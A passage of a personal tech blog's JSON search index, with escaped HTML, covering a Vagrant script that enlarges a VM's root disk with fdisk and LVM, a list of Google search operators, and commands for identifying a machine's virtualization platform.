Linux\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    sudo yum makecache\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    sudo yum install -y util-linux\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    sudo yum install -y lvm2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    sudo yum install -y e2fsprogs\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -n \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ecommand -v apt-get\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026gt;\u0026gt; Detected apt-based Linux\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    sudo apt-get update -y\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    sudo apt-get install -y fdisk\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    sudo apt-get install -y lvm2\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    sudo apt-get install -y e2fsprogs\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eROOT_DISK_DEVICE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/dev/sda\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eROOT_DISK_DEVICE_PART\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/dev/sda1\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eLV_PATH\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003esudo lvdisplay -c | sed -n 1p | awk -F \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;:\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print $1;}\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eFS_PATH\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003edf / | sed -n 2p | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print $1;}\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eROOT_FS_SIZE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003edf -h / | sed -n 2p | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print $2;}\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;The root file system (/) has a size of \u003c/span\u003e$ROOT_FS_SIZE\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026gt; Increasing disk size of \u003c/span\u003e$ROOT_DISK_DEVICE\u003cspan style=\"color:#e6db74\"\u003e to available maximum\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo fdisk $ROOT_DISK_DEVICE \u003cspan style=\"color:#e6db74\"\u003e\u0026lt;\u0026lt;EOF\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003ed\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003en\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003ep\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003e2048\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eno\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003ew\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo pvresize $ROOT_DISK_DEVICE_PART\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo lvextend -l +100%FREE $LV_PATH\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esudo resize2fs -p $FS_PATH\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eROOT_FS_SIZE\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003edf -h / | sed -n 2p | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print $2;}\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e`\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eecho \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;The root file system (/) has a size of \u003c/span\u003e$ROOT_FS_SIZE\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eexit \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Vagrant"],"title":"How to automatically resize virtual box disk with vagrant"},{"categories":["URL","GitBook"],"contents":" gitbook 常用的插件 ","date":"August 18, 2020","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200818-1190000019806829/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://segmentfault.com/a/1190000019806829\" target=\"_blank\" rel=\"noopener\"\u003egitbook 常用的插件\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","GitBook"],"title":"gitbook常用的插件"},{"categories":["URL","Google"],"contents":" Google Search Operators: The Complete List (44 Advanced Operators) Working Search operator What it does Example \u0026quot; \u0026quot; Search for results that mention a word or phrase. \u0026quot;steve jobs\u0026quot; OR Search for results related to X or Y. jobs OR gates | Same as OR. jobs | gates AND Search for results related to X and Y. jobs AND gates - Search for results that don\u0026rsquo;t mention a word or phrase. jobs -apple * Wildcard matching any word or phrase. steve * apple ( ) Group multiple searches. (ipad OR iphone) apple define: Search for the definition of a word or phrase. define:entrepreneur cache: Find the most recent cache of a webpage. cache:apple.com filetype: Search for particular types of files (e.g., PDF). apple filetype:pdf ext: Same as filetype: apple ext:pdf site: Search for results from a particular website. site:apple.com related: Search for sites related to a given domain. related:apple.com intitle: Search for pages with a particular word in the title tag. intitle:apple allintitle: Search for pages with multiple words in the title tag. allintitle:apple iphone inurl: Search for pages with a particular word in the URL. inurl:apple allinurl: Search for pages with multiple words in the URL. allinurl:apple iphone intext: Search for pages with a particular word in their content. intext:apple iphone allintext: Search for pages with multiple words in their content. allintext:apple iphone weather: Search for the weather in a location. weather:san francisco stocks: Search for stock information for a ticker. stocks:aapl map: Force Google to show map results. map:silicon valley movie: Search for information about a movie. movie:steve jobs in Convert one unit to another. $329 in GBP source: Search for results from a particular source in Google News. apple source:the_verge before: Search for results from before a particular date. apple before:2007-06-29 after: Search for results from after a particular date. apple after:2007-06-29 Unreliable Search operator What it does Example #..# Search within a range of numbers. iphone case $50..$60 inanchor: Search for pages with backlinks containing specific anchor text. inanchor:apple allinanchor: Search for pages with backlinks containing multiple words in their anchor text. allinanchor:apple iphone AROUND(X) Search for pages with two words or phrases within X words of one another. apple AROUND(4) iphone loc: Find results from a given area. loc:\u0026quot;san francisco\u0026quot; apple location: Find news from a certain location in Google News. location:\u0026quot;san francisco\u0026quot; apple daterange: Search for results from a particular date range. daterange:11278-13278 Not working (officially dropped by Google) Search operator What it does Example ~ Include synonyms in the search (dropped 2013). ~apple + Search for results mentioning an exact word or phrase (dropped 2011). jobs +apple inpostauthor: Search for posts by a specific author in Google Blog Search (discontinued). inpostauthor:\u0026quot;steve jobs\u0026quot; allinpostauthor: Same as inpostauthor:, but removes the need for quotes. allinpostauthor:steve jobs inposttitle: Search for posts with certain words in the title in Google\u0026rsquo;s discontinued Blog Search. inposttitle:apple iphone link: Search for pages linking to a particular domain or URL (dropped 2017). link:apple.com info: Search for information about a specific page or website (dropped 2017). info:apple.com id: Same as info: id:apple.com phonebook: Search for someone\u0026rsquo;s phone number (dropped 2010). phonebook:tim cook # Search for hashtags on Google+ (dropped 2019). #apple ","date":"August 14, 2020","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200814-google-advanced-search-operators/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://ahrefs.com/blog/google-advanced-search-operators/\" target=\"_blank\" rel=\"noopener\"\u003eGoogle Search Operators: The Complete List (44 Advanced Operators)\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch4 id=\"working\"\u003eWorking\u003c/h4\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eSearch operator\u003c/th\u003e\n          \u003cth\u003eWhat it does\u003c/th\u003e\n          \u003cth\u003eExample\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e\u0026quot; \u0026quot;\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for results that mention a word or phrase.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e\u0026quot;steve jobs\u0026quot;\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eOR\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for results related to X or Y.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003ejobs OR gates\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e|\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSame as \u003ccode\u003eOR\u003c/code\u003e.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003ejobs | gates\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eAND\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for results related to X and Y.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003ejobs AND gates\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e-\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for results that don\u0026rsquo;t mention a word or phrase.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003ejobs -apple\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e*\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eWildcard matching any word or phrase.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003esteve * apple\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e( )\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eGroup multiple searches.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e(ipad OR iphone) apple\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003edefine:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for the definition of a word or phrase.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003edefine:entrepreneur\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ecache:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eFind the most recent cache of a webpage.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003ecache:apple.com\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003efiletype:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for particular types of files (e.g., PDF).\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eapple filetype:pdf\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eext:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSame as \u003ccode\u003efiletype:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eapple ext:pdf\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003esite:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for results from a particular website.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003esite:apple.com\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003erelated:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for sites related to a given domain.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003erelated:apple.com\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eintitle:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for pages with a particular word in the title tag.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eintitle:apple\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eallintitle:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for pages with multiple words in the title tag.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eallintitle:apple iphone\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003einurl:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for pages with a particular word in the URL.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003einurl:apple\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eallinurl:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for pages with multiple words in the URL.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eallinurl:apple iphone\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eintext:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for pages with a particular word in their content.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eintext:apple iphone\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eallintext:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for pages with multiple words in their content.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eallintext:apple iphone\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eweather:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for the weather in a location.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eweather:san francisco\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003estocks:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for stock information for a ticker.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003estocks:aapl\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003emap:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eForce Google to show map results.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003emap:silicon valley\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003emovie:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for information about a movie.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003emovie:steve jobs\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ein\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eConvert one unit to another.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e$329 in GBP\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003esource:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for results from a particular source in Google News.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eapple source:the_verge\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ebefore:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for results from before a particular date.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eapple before:2007-06-29\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eafter:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for results from after a particular date.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eapple after:2007-06-29\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch4 id=\"unreliable\"\u003eUnreliable\u003c/h4\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eSearch operator\u003c/th\u003e\n          \u003cth\u003eWhat it does\u003c/th\u003e\n          \u003cth\u003eExample\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e#..#\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch within a range of numbers.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eiphone case $50..$60\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003einanchor:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for pages with backlinks containing specific anchor text.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003einanchor:apple\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eallinanchor:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for pages with backlinks containing multiple words in their anchor text.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eallinanchor:apple iphone\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eAROUND(X)\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for pages with two words or phrases within X words of one another.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eapple AROUND(4) iphone\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eloc:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eFind results from a given area.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eloc:\u0026quot;san francisco\u0026quot; apple\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003elocation:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eFind news from a certain location in Google News.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003elocation:\u0026quot;san francisco\u0026quot; apple\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003edaterange:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for results from a particular date range.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003edaterange:11278-13278\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e\n\u003ch4 id=\"not-working-officially-dropped-by-google\"\u003eNot working (officially dropped by Google)\u003c/h4\u003e\n\u003ctable\u003e\n  \u003cthead\u003e\n      \u003ctr\u003e\n          \u003cth\u003eSearch operator\u003c/th\u003e\n          \u003cth\u003eWhat it does\u003c/th\u003e\n          \u003cth\u003eExample\u003c/th\u003e\n      \u003c/tr\u003e\n  \u003c/thead\u003e\n  \u003ctbody\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e~\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eInclude synonyms in the search (dropped 2013).\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e~apple\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e+\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for results mentioning an exact word or phrase (dropped 2011).\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003ejobs +apple\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003einpostauthor:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for posts by a specific author in Google Blog Search (discontinued).\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003einpostauthor:\u0026quot;steve jobs\u0026quot;\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eallinpostauthor:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSame as \u003ccode\u003einpostauthor:\u003c/code\u003e, but removes the need for quotes.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eallinpostauthor:steve jobs\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003einposttitle:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for posts with certain words in the title in Google\u0026rsquo;s discontinued Blog Search.\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003einposttitle:apple iphone\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003elink:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for pages linking to a particular domain or URL (dropped 2017).\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003elink:apple.com\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003einfo:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for information about a specific page or website (dropped 2017).\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003einfo:apple.com\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003eid:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSame as \u003ccode\u003einfo:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003eid:apple.com\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003ephonebook:\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for someone\u0026rsquo;s phone number (dropped 2010).\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003ephonebook:tim cook\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n      \u003ctr\u003e\n          \u003ctd\u003e\u003ccode\u003e#\u003c/code\u003e\u003c/td\u003e\n          \u003ctd\u003eSearch for hashtags on Google+ (dropped 2019).\u003c/td\u003e\n          \u003ctd\u003e\u003ccode\u003e#apple\u003c/code\u003e\u003c/td\u003e\n      \u003c/tr\u003e\n  \u003c/tbody\u003e\n\u003c/table\u003e","tags":["URL","Google"],"title":"Google Search Operators: The Complete List (44 Advanced Operators)"},{"categories":["URL","Virtualization","Linux"],"contents":" 确定虚拟化技术的简便方法 dmidecode -s system-product-name 虚拟化技术\nVMware 工作站 root@router:~# dmidecode -s system-product-name VMware Virtual Platform 虚拟盒子 root@router:~# dmidecode -s system-product-name VirtualBox Qemu 与 KVM root@router:~# dmidecode -s system-product-name KVM Qemu（模拟）\nroot@router:~# dmidecode -s system-product-name Bochs Microsoft 虚拟 PC root@router:~# dmidecode | egrep -i \u0026#39;manufacturer|product\u0026#39; Manufacturer: Microsoft Corporation Product Name: Virtual Machine 维尔图佐 root@router:~# dmidecode /dev/mem: Permission denied en root@router:~# dmidecode | grep -i domU Product Name: HVM domU /dev/disk/by-id 如果您没有 dmidecode 运行权， 则可以使用： ls -1 /dev/disk/by-id/\n虚拟化技术：QEMU [root@host-7-129 ~]# ls -1 /dev/disk/by-id/ ata-QEMU_DVD-ROM_QM00003 ata-QEMU_HARDDISK_QM00001 ata-QEMU_HARDDISK_QM00001-part1 ata-QEMU_HARDDISK_QM00002 ata-QEMU_HARDDISK_QM00002-part1 scsi-SATA_QEMU_HARDDISK_QM00001 scsi-SATA_QEMU_HARDDISK_QM00001-part1 scsi-SATA_QEMU_HARDDISK_QM00002 scsi-SATA_QEMU_HARDDISK_QM00002-part1 ","date":"July 29, 2020","hero":"/images/hero/linux.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2020/20200729-easy-way-to-determine-virtualization-technology/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://qastack.cn/unix/89714/easy-way-to-determine-virtualization-technology\" target=\"_blank\" rel=\"noopener\"\u003e确定虚拟化技术的简便方法\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"dmidecode--s-system-product-name\"\u003e\u003ccode\u003edmidecode -s system-product-name\u003c/code\u003e\u003c/h3\u003e\n\u003cp\u003e虚拟化技术\u003c/p\u003e\n\u003ch4 id=\"vmware-工作站\"\u003eVMware 